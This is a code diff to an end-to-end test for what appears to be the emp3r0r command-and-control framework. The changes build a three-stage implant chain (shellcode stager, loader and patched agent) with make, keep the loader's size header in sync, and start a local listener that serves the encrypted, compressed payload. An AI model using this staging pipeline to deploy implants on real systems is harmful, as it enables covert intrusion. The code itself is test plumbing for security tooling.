@@ -42,6 +42,33 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
+func parseStage1Size(headerPath string) (int, error) {
+	b, err := os.ReadFile(headerPath)
+	if err != nil {
+		return 0, err
+	}
+	for _, line := range strings.Split(string(b), "\n") {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "#define STAGE1_SIZE ") {
+			parts := strings.Fields(line)
+			if len(parts) != 3 {
+				return 0, fmt.Errorf("invalid STAGE1_SIZE line: %s", line)
+			}
+			n, err := strconv.Atoi(parts[2])
+			if err != nil {
+				return 0, fmt.Errorf("parse STAGE1_SIZE value: %w", err)
+			}
+			return n, nil
+		}
+	}
+	return 0, fmt.Errorf("STAGE1_SIZE not found in %s", headerPath)
+}
+
+func writeStage1SizeHeader(headerPath string, size int) error {
+	content := fmt.Sprintf("#ifndef STAGE1_SIZE_H\n#define STAGE1_SIZE_H\n#define STAGE1_SIZE %d\n#endif\n", size)
+	return os.WriteFile(headerPath, []byte(content), 0o644)
+}
+
 // signUUID signs the agent UUID with the CA private key
 func signUUID(uuid string, keyFile string) (string, error) {
 	// Read private key
@@ -250,6 +277,7 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 	if err != nil {
 		t.Fatalf("Failed to write patched agent: %v", err)
 	}
+	logging.Infof("Stage 2 payload size (patched agent): %d bytes", len(patchedAgentBytes))
 	logging.Successf("Mock agent patched with config")
 
 	// Dummy operator for preflight
@@ -280,6 +308,8 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 	// 5. Build Shellcode Stager
 	stagerBinPath := filepath.Join(tmpDir, "stager.bin")
 	stagerListenerPort := util.RandInt(60001, 65000)
+	loaderBinFromBuild := "../loader.bin"
+	stage1SizeHeader := "../stage1_size.h"
 
 	// We need to run make or compile stub.c directly.
 	// Let's use gcc directly to have control (and mimic Makefile).
@@ -287,35 +317,12 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 	// CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. ...
 	// We need to set defines like -DDOWNLOAD_PORT etc.
 
-	// We need to setup a listener for the stager to download the agent.
-	// We will use core/lib/listener to serve the PATCHED AGENT.
+	// We need to setup a listener for the stager to download a staged blob.
+	// New architecture: listener serves loader.bin + encrypted/compressed payload.
 
-	// Start Stager Listener
+	// Listener parameters
 	stagerPortStr := fmt.Sprintf("%d", stagerListenerPort)
 	stagerKey := "password123" // arbitrary
-
-	go func() {
-		// Serve the patched agent
-		// compression=true matching standard behavior
-		err := listener.HTTPAESCompressedListener(patchedAgentPath, stagerPortStr, stagerKey, true)
-		if err != nil {
-			logging.Errorf("Stager listener failed: %v", err)
-		}
-	}()
-	// Wait for stager listener to be ready
-	listenerReady := false
-	for i := 0; i < 100; i++ {
-		conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", stagerPortStr))
-		if err == nil {
-			conn.Close()
-			listenerReady = true
-			break
-		}
-		time.Sleep(500 * time.Millisecond)
-	}
-	if !listenerReady {
-		t.Fatalf("Stager listener failed to start on port %s", stagerPortStr)
-	}
 
 	// Determine flags for stub.c
 	// We need the XOR mechanism as in the Makefile.
@@ -327,17 +334,7 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 	// We need to compile these. They are in the current directory (modules/shellcode_stager).
 	// But we are running go test in that directory, so inputs are just filenames.
 
-	// However, we first need to build downloader.bin and generate header like the Makefile does.
-	// This makes it complicated to replicate the whole Makefile in Go test.
-	// Can we just run `make`?
-	// The Makefile supports environment variables.
-
-	// Let's try running `make` with overrides.
-	// We need to be careful not to overwrite the real bin files in the source dir if possible,
-	// or just clean up after.
-	// `make` will generate `stager.bin` in the current dir.
-
-	// `make` will generate `stager.bin` in the current dir.
+	// Build stage0 (stager.bin) and stage1 (loader.bin) with overrides.
 
 	// Clean previous build to ensure CFLAGS (ports) update triggers rebuild
 	cleanCmd := exec.Command("make", "clean")
@@ -362,6 +359,94 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 	logging.Successf("Stager built with make")
 	defer exec.Command("make", "clean").Run()
 
+	if _, err := os.Stat(loaderBinFromBuild); err != nil {
+		t.Fatalf("Failed to find generated loader.bin (%s): %v", loaderBinFromBuild, err)
+	}
+	if _, err := os.Stat(stage1SizeHeader); err != nil {
+		t.Fatalf("Failed to find generated stage1_size.h (%s): %v", stage1SizeHeader, err)
+	}
+
+	for range 3 {
+		stage1Size, err := parseStage1Size(stage1SizeHeader)
+		if err != nil {
+			t.Fatalf("Failed to parse STAGE1_SIZE: %v", err)
+		}
+
+		loaderBytes, err := os.ReadFile(loaderBinFromBuild)
+		if err != nil {
+			t.Fatalf("Failed to read loader.bin: %v", err)
+		}
+
+		if stage1Size == len(loaderBytes) {
+			break
+		}
+
+		logging.Warningf("STAGE1_SIZE mismatch (header=%d, loader.bin=%d), rebuilding stage1", stage1Size, len(loaderBytes))
+		err = writeStage1SizeHeader(stage1SizeHeader, len(loaderBytes))
+		if err != nil {
+			t.Fatalf("Failed to rewrite stage1_size.h: %v", err)
+		}
+
+		rebuildCmd := exec.Command("make",
+			fmt.Sprintf("DOWNLOAD_HOST=%s", downloadHost),
+			fmt.Sprintf("DOWNLOAD_PORT=%s", downloadPort),
+			fmt.Sprintf("DOWNLOAD_PATH=%s", downloadPath),
+			fmt.Sprintf("DOWNLOAD_KEY=%s", downloadKey),
+			"DEBUG=1",
+			"SLEEP_MIN=1",
+			"SLEEP_MAX=2",
+			"loader",
+			"loader.bin",
+		)
+		rebuildCmd.Dir = ".."
+		rebuildOut, rebuildErr := rebuildCmd.CombinedOutput()
+		if rebuildErr != nil {
+			t.Fatalf("Failed to rebuild loader with reconciled STAGE1_SIZE: %v\nOutput: %s", rebuildErr, string(rebuildOut))
+		}
+	}
+
+	finalStage1Size, err := parseStage1Size(stage1SizeHeader)
+	if err != nil {
+		t.Fatalf("Failed to parse final STAGE1_SIZE: %v", err)
+	}
+	finalLoaderBytes, err := os.ReadFile(loaderBinFromBuild)
+	if err != nil {
+		t.Fatalf("Failed to read final loader.bin: %v", err)
+	}
+	if finalStage1Size != len(finalLoaderBytes) {
+		t.Fatalf("Unstable STAGE1_SIZE after reconciliation: header=%d loader.bin=%d", finalStage1Size, len(finalLoaderBytes))
+	}
+	logging.Infof("Stage 1 loader size: %d bytes", len(finalLoaderBytes))
+
+	// Start Stager Listener after make so loader.bin is available.
+	if err := os.Setenv("EMP3R0R_STAGE1_LOADER", loaderBinFromBuild); err != nil {
+		t.Fatalf("Failed to set EMP3R0R_STAGE1_LOADER: %v", err)
+	}
+	defer os.Unsetenv("EMP3R0R_STAGE1_LOADER")
+
+	go func() {
+		// Serve patched agent as Stage 2 payload; listener prepends Stage 1 loader.bin
+		err := listener.HTTPAESCompressedListener(patchedAgentPath, stagerPortStr, stagerKey, true)
+		if err != nil {
+			logging.Errorf("Stager listener failed: %v", err)
+		}
+	}()
+
+	// Wait for stager listener to be ready
+	listenerReady := false
+	for range 100 {
+		conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", stagerPortStr))
+		if err == nil {
+			conn.Close()
+			listenerReady = true
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+	if !listenerReady {
+		t.Fatalf("Stager listener failed to start on port %s", stagerPortStr)
+	}
+
 	// Move the generated stager.bin to tmpDir to be safe/clear
 	// Use copy instead of Rename to avoid cross-device link errors
 	input, err := os.ReadFile("../stager.bin") // stager.bin is in parent directory
@@ -372,6 +457,7 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 	if err != nil {
 		t.Fatalf("Failed to write stager.bin to tmp: %v", err)
 	}
+	logging.Infof("Stage 0 stager size: %d bytes", len(input))
 	os.Remove("../stager.bin")
 
 	// 6. Build and Run Loader
